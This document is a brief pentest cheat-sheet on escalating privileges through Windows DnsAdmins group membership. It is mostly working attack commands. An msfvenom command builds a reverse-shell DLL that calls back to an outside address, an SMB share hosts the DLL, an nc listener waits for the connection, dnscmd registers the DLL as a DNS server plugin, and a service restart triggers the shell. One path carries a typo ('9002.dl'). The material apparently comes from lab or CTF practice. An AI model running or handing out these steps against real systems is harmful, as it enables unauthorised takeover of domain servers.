# DNSADMIN 

If you are part of dnsadmin group you can privilege escalate by load a plugin dll.

Build dll with msfvenom

```sh
mkdir upload
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=9002 -f dll > upload/9002.dll
```

Start smbserver

```sh
sudo smbserver.py upload ./upload
```

Start your listener

```
nc -lnvp 9002
```

Load dll


```sh
dnscmd fqdn.local /config /serverlevelplugindll \\xx.xx.xx.xx\upload\9002.dl
```

Note to get fqdn if you are on same machine you can use this command

```sh
[System.Net.Dns]::GetHostByName(($env:computerName))
```

Restart dns server

```
sc.exe stop dns
sc.exe start dns
```

You should now have a shell.

